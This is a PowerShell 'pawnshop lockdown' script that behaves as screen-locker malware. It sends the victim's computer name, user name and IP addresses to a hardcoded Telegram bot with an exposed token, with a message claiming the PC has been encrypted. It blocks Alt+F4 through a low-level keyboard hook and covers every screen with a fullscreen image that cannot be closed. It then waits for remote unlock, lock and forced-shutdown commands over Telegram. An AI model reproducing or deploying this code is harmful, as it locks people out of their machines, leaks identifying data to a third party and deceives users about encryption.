
# Pawnshop Lockdown Script with Full Telegram Control and Alt+F4 Block

# --- Configuration ---
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$unlockCommand = "/unlock$user"
$lockCommand = "/lock$user"
$shutdownCommand = "/shutdown$user"
$lockFile = "$env:APPDATA\lock_status.txt"

# Create lock file if it doesn't exist
if (-not (Test-Path $lockFile)) { "locked" | Out-File -FilePath $lockFile -Force -Encoding UTF8 }

# Check lock state
try {
    $state = Get-Content $lockFile -ErrorAction Stop
} catch {
    $state = "locked"
}

if ($state -eq "unlocked") {
    return
}

# Download image
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# Send Telegram notification
try {
    $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127|169' })[0].IPAddress
} catch { $ipLocal = "n/a" }

try { $ipPublic = (Invoke-RestMethod "https://api.ipify.org") } catch { $ipPublic = "n/a" }

$message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic`n`nCommands:`n$unlockCommand`n$lockCommand`n$shutdownCommand`n/unlock$pc`n/shutdown$pc`n/lock$pc"
$body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'

# Load UI libs
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

# Keyboard Hook to block Alt+F4 only
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyBlocker {
    private static IntPtr hookId = IntPtr.Zero;
    private static bool alt = false;
    private delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);
    private static HookProc proc = HookCallback;
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, HookProc proc, IntPtr mod, uint tid);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int code, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
    const int WH_KEYBOARD_LL = 13;
    const int WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104, WM_KEYUP = 0x0101, WM_SYSKEYUP = 0x0105;
    public static void Block() {
        hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
    }
    public static void Unblock() {
        UnhookWindowsHookEx(hookId);
    }
    private static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam) {
        if (code >= 0) {
            int vk = Marshal.ReadInt32(lParam);
            if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
                if (vk == 0x12) alt = true;
                if (vk == 0x73 && alt) return (IntPtr)1; // Alt+F4
                if (vk == 0x43) Environment.Exit(0); // C to exit manually
            }
            if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP) {
                if (vk == 0x12) alt = false;
            }
        }
        return CallNextHookEx(hookId, code, wParam, lParam);
    }
}
"@
[KeyBlocker]::Block()

# Display full screen image
$forms = foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{ TopMost = $true; FormBorderStyle = 'None'; WindowState = 'Maximized'; StartPosition = 'Manual'; Bounds = $screen.Bounds; KeyPreview = $true; Cursor = [Windows.Forms.Cursors]::None }
    $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel = $true } })
    $pb = New-Object Windows.Forms.PictureBox -Property @{ Image = [Drawing.Image]::FromFile($tempImagePath); Dock = 'Fill'; SizeMode = 'StretchImage' }
    $form.Controls.Add($pb)
    $form.Show()
    $form
}

# Telegram listener
$offset = 0
try {
    $init = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates"
    if ($init.result.Count -gt 0) {
        $offset = ($init.result | Select-Object -Last 1).update_id + 1
    }
} catch { $offset = 0 }

$script:AllowClose = $false
$timer = New-Object Windows.Forms.Timer -Property @{ Interval = 3000 }
$timer.Add_Tick({
    try {
        $resp = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        foreach ($u in $resp.result) {
            $offset = $u.update_id + 1
            $txt = $u.message.text.ToLower().Trim()
            if ($txt -eq "/unlock$user" -or $txt -eq "/unlock$pc") {
                "unlocked" | Out-File $lockFile -Force
                $script:AllowClose = $true
                [Windows.Forms.Application]::Exit()
            } elseif ($txt -eq "/lock$user" -or $txt -eq "/lock$pc") {
                "locked" | Out-File $lockFile -Force
            } elseif ($txt -eq "/shutdown$user" -or $txt -eq "/shutdown$pc") {
                "unlocked" | Out-File $lockFile -Force
                Stop-Computer -Force
            }
        }
    } catch {}
})
$timer.Start()

[Windows.Forms.Application]::Run()

$timer.Stop()
[KeyBlocker]::Unblock()
